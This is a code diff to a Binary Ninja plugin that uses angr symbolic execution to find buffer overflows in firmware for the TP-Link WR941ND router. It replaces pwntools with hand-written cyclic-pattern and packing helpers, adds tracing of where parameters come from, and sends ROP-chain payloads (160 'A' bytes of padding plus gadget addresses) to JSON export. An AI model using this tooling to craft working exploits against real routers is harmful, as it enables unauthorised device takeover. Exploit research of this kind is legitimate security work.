@@ -16,11 +16,81 @@ import os
 import json
 import collections
 import binascii
-from pwn import *
+import struct
 
 registers = {}
 with open(os.path.dirname(__file__)+'/registers.json') as f:
   registers = json.load(f)
+
+
+from string import ascii_uppercase, ascii_lowercase, digits
+
+MAX_PATTERN_LENGTH = 20280
+
+class MaxLengthException(Exception):
+    pass
+
+class WasNotFoundException(Exception):
+    pass
+
+
+def pattern_gen(length):
+    """
+    Generate a pattern of a given length up to a maximum
+    of 20280 - after this the pattern would repeat
+    """
+    if length >= MAX_PATTERN_LENGTH:
+        raise MaxLengthException('ERROR: Pattern length exceeds maximum of %d' % MAX_PATTERN_LENGTH)
+
+    pattern = ''
+    for upper in ascii_uppercase:
+        for lower in ascii_lowercase:
+            for digit in digits:
+                if len(pattern) < length:
+                    pattern += upper+lower+digit
+                else:
+                    out = pattern[:length]
+                    return out
+
+def p32(data, endian="big"):
+    if endian == "big":
+       return struct.pack('>I', data)
+    else:
+        return struct.pack('<I', data)
+
+def u32(data, endian="big"):
+    if endian == "big":
+        return hex(struct.unpack('>I', data)[0])
+    else:
+        return hex(struct.unpack('<I', data)[0])
+
+def pattern_search(search_pattern):
+    """
+    Search for search_pattern in pattern.  Convert from hex if needed
+    Looking for needle in haystack
+    """
+    needle = search_pattern
+
+    try:
+        if needle.startswith('0x'):
+            # Strip off '0x', convert to ASCII and reverse
+            needle = needle[2:]
+            needle = bytearray.fromhex(needle).decode('ascii')
+            needle = needle[::-1]
+    except (ValueError, TypeError) as e:
+        raise
+
+    haystack = ''
+    for upper in ascii_uppercase:
+        for lower in ascii_lowercase:
+            for digit in digits:
+                haystack += upper+lower+digit
+                found_at = haystack.find(needle)
+                if found_at > -1:
+                    return found_at
+
+    raise WasNotFoundException('Couldn`t find %s (%s) anywhere in the pattern.' %
+          (search_pattern, needle))
 
 
 class Explorer(ABC):
@@ -503,7 +573,7 @@ class UIPlugin(PluginCommand):
             result = interaction.get_int_input("Size: ", "Pattern Create")
             for p in params:
                 if p['pattern_create'] == 1:
-                    p['value'] = cyclic(result)
+                    p['value'] = pattern_gen(result)
         binja.log_info("[+] pattern size: {0}".format(result))
         self._display_converted_params(params)
         return result
@@ -518,6 +588,62 @@ class UIPlugin(PluginCommand):
         for p in params:
             for k, v in p.items():
                 binja.log_info("[+] {0}: {1}".format(k, v))
+
+    def step_up(self, var, func_caller):
+        next_instr = func_caller.mlil.get_ssa_var_definition(var)
+        if next_instr:
+            print(hex(next_instr.address), next_instr)
+            var_read = next_instr.ssa_form.vars_read
+            if var_read:
+                print(var_read[0])
+                self.step_up(var_read[0], func_caller)
+
+
+    def find_arg_origin(self, bv, addr):
+        """
+        Parameters
+        ----------
+        bv : BinaryView instance
+        addr: BinaryView address
+        """
+        print('addr', hex(addr))
+        func = bv.get_function_at(addr)
+        if(func == None or type(func) != binja.function.Function):
+            self.display_message("Error", "This is not a function!")
+            return
+        # func_symbol = bv.get_symbol_by_raw_name("strcpy")
+        # func_refs = [(ref.function, ref.address) for ref in bv.get_code_refs(func_symbol.address)]
+        func_refs = [ (ref.function, ref.address) for ref in bv.get_code_refs(bv.symbols[func.name].address)]
+        print("func refs", func_refs)
+        for function, addr in func_refs:
+            try:
+                func_ssa = function.get_low_level_il_at(addr).mlil.ssa_form
+                binja.log_info("[+] Function as SSA {0}".format(
+                    func_ssa))
+                for param in func_ssa.params:
+                    print("Current param {0}".format(param))
+                    self.step_up(param.src, function)
+            except AttributeError as e:
+                binja.log_info("Error, {0}".format(e))
+                pass
+
+        # binja.log_info("Func callers {0}".format(func.callers))
+        # func_caller = func.callers[0]
+        # if not func_caller:
+        #     self.display_message("Error", "No callers found!")
+        #     return
+        # binja.log_info("[+] Function caller: {0}".format(
+        #     func_caller))
+        # try:
+        #     func_ssa = func_caller.get_low_level_il_at(BackgroundTaskManager.start_addr).mlil.ssa_form
+        #     binja.log_info("[+] Function as SSA {0}".format(
+        #         func_ssa))
+        #     for param in func_ssa.params:
+        #             print("Current param {0}".format(param))
+        #             self.step_up(param.src, func_caller)
+        # except AttributeError as e:
+        #     binja.log_info("Error, {0}".format(e))
+        #     pass
 
     def set_function_params(self, bv, addr):
         """
@@ -645,10 +771,11 @@ class BackgroundTaskManager():
         self.vulnerability_explorer = None
         self.rop_explorer = None
         self.exploit_creator = None
+        self.json_exploit_creator = None
         self.proj = None
         self.init = None
         self.libc_base = None
-        self.payload = ''
+        self.payload = None
 
     @classmethod
     def set_exploit_payload(self, init, payload):
@@ -662,7 +789,6 @@ class BackgroundTaskManager():
             payload after ROP
         
         """
-
         self.payload = payload
         self.init = init
 
@@ -756,7 +882,7 @@ class BackgroundTaskManager():
             self.init = b"A"*160 + b"BBBB" + \
                 p32(self.gadget2, endian=endian) + \
                 p32(self.gadget1, endian=endian)
-            self.rop_explorer = ROPExplorer(bv, self.proj, start_addr, end_addr, first=self.gadget1, second=self.gadget2,
+            self.rop_explorer = ROPExplorer(bv, self.proj, start_addr, end_addr, init=self.init, first=self.gadget1, second=self.gadget2,
                                             third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
 
             args = self.rop_explorer.set_args(
@@ -779,19 +905,21 @@ class BackgroundTaskManager():
         self.exploit_creator = FileExploitCreator(bv, self.init, self.payload)
         self.runner = AngrRunner(bv, self.exploit_creator)
         self.runner.start()
-
-   
-    def exploit_to_json(self, bv):
+ 
+    @classmethod
+    def exploit_to_json(self, bv, init, payload):
         """
         Parameters
         ----------
         bv : BinaryView instance
         """
-
-        self.json_exploit_creator = JSONExploitCreator(
-            bv, self.init, self.payload)
-        self.runner = AngrRunner(bv, self.json_exploit_creator)
-        self.runner.start()
+        if payload:
+            self.json_exploit_creator = JSONExploitCreator(
+                bv, init, payload)
+            self.runner = AngrRunner(bv, self.json_exploit_creator)
+            self.runner.start()
+        else:
+            binja.log_warn("JSON payload issue {0}".format(payload))
 
     def stop(self, bv):
         """
@@ -1026,15 +1154,15 @@ class VulnerabilityExplorer(MainExplorer):
         for arg in data:
             pattern = found.solver.eval(found.regs.get(arg), cast_to=bytes)
             if self._find_pattern(self.params, pattern):
-                if(arg == 'ra' and cyclic_find(pattern.decode())):
+                if(arg == 'ra' and pattern_search(pattern.decode())):
                     binja.log_warn("[*] Buffer overflow detected !!!")
                     binja.log_warn(
-                        "[*] We can control ${0} after {1} bytes !!!!".format(arg, cyclic_find(pattern.decode())))
-                    report[arg] = cyclic_find(pattern.decode())
+                        "[*] We can control ${0} after {1} bytes !!!!".format(arg, pattern_search(pattern.decode())))
+                    report[arg] = pattern_search(pattern.decode())
                 else:
                     binja.log_warn(
-                        "[+] Register ${0} overwritten after: {1} bytes".format(arg, cyclic_find(pattern.decode())))
-                    report[arg] = cyclic_find(pattern.decode())
+                        "[+] Register ${0} overwritten after: {1} bytes".format(arg, pattern_search(pattern.decode())))
+                    report[arg] = pattern_search(pattern.decode())
             else:
                 if(not silence):
                     binja.log_info(
@@ -1076,7 +1204,7 @@ class ROPExplorer(MainExplorer):
         self.proj = project
         self.proj.analyses.CFGFast(
             regions=[(self.func_start_addr, self.func_end_addr)])
-        self.init = None
+        self.init = kwargs['init']
         self.args = {}
         self.gadget1 = kwargs['first']
         self.gadget2 = kwargs['second']
@@ -1149,7 +1277,7 @@ class ROPExplorer(MainExplorer):
         contents = "====Stack Data ====\r\n\n"
         for key, value in data.items():
             contents += "{0}: {1}\r\n\n".format(key.decode(),
-                                                hex(u32(value, endian=self.endian)))
+                                                u32(value, endian=self.endian))
         return contents
 
     def stack_adjust(self, state, reg, size, data="EEEE", vector_size=32):
@@ -1282,7 +1410,8 @@ class ROPExplorer(MainExplorer):
             print("Payload", sortedDict)
             interaction.show_markdown_report(
                 'ROP Stack', self.get_stack_report(sortedDict))
-            BackgroundTaskManager.set_exploit_payload(self.init, sortedDict)
+            # BackgroundTaskManager.set_exploit_payload(self.init, sortedDict)
+            BackgroundTaskManager.exploit_to_json(self.bv, self.init, sortedDict)
 
 
 class FileExploitCreator(Explorer):
@@ -1323,6 +1452,7 @@ class JSONExploitCreator(Explorer):
         pass
 
     def decode_from_bytes(self, data):
+        binja.log_info("DATA IS {0}".format(data))
         decoded_dict = collections.OrderedDict()
         for k, v in data.items():
             decoded_dict[k.decode()] = u32(v)
@@ -1351,10 +1481,10 @@ PluginCommand.register(
     "Explorer\WR941ND\Explore", "Attempt to solve for a path that satisfies the constraints given", btm.vuln_explore)
 PluginCommand.register("Explorer\WR941ND\ROP\Build",
                        "Try to build exploit rop chain", btm.build_rop)
-PluginCommand.register("Explorer\WR941ND\Generate Exploit\Save as JSON",
-                       "Try to save exploit as JSON", btm.exploit_to_json)
-PluginCommand.register("Explorer\WR941ND\Generate Exploit\Save to File",
-                       "Try to build exploit fom rop chain", btm.exploit_to_file)
+# PluginCommand.register("Explorer\WR941ND\Generate Exploit\Save as JSON",
+#                        "Try to save exploit as JSON", btm.exploit_to_json)
+# PluginCommand.register("Explorer\WR941ND\Generate Exploit\Save to File",
+#                        "Try to build exploit fom rop chain", btm.exploit_to_file)
 
 PluginCommand.register_for_address("Explorer\WR941ND\Start Address\Set",
                                                    "Set execution starting point address", ui_plugin.set_start_address)
@@ -1370,5 +1500,7 @@ PluginCommand.register(
     "Explorer\WR941ND\Library\Set Library Path", "Add LD_PATH", ui_plugin.set_ld_path)
 PluginCommand.register_for_address(
     "Explorer\WR941ND\Function\Set Params", "Add function params", ui_plugin.set_function_params)
+PluginCommand.register_for_address(
+    "Explorer\WR941ND\Function\Find Param Origin", "Find origin of function param", ui_plugin.find_arg_origin)
 PluginCommand.register(
         "Explorer\WR941ND\Clear All", "Clear data", ui_plugin.clear)
